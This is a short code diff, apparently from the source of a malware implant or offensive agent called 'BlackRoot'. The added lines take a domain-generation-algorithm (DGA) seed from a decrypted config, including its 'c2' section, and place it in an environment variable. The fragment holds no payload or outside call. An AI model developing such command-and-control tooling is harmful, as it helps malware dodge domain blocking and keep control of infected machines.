@@ -97,6 +97,15 @@ class BlackRootAgentInitializer:
                 # Store decrypted config globally
                 os.environ['BLACKROOT_CONFIG'] = json.dumps(decrypted_config)
                 
+                # S14: Extract dynamic DGA seed from decrypted configuration
+                dga_seed = (
+                    decrypted_config.get("dga_seed")
+                    or decrypted_config.get("c2", {}).get("dga_seed")
+                    or self.seed
+                )
+                os.environ['DGA_SEED'] = str(dga_seed)
+                logger.info("  - Dynamic DGA seed bound to environment (from encrypted config)")
+                
                 self.results["components"]["config_decryption"] = {
                     "status": "success",
                     "config_keys": len(decrypted_config),
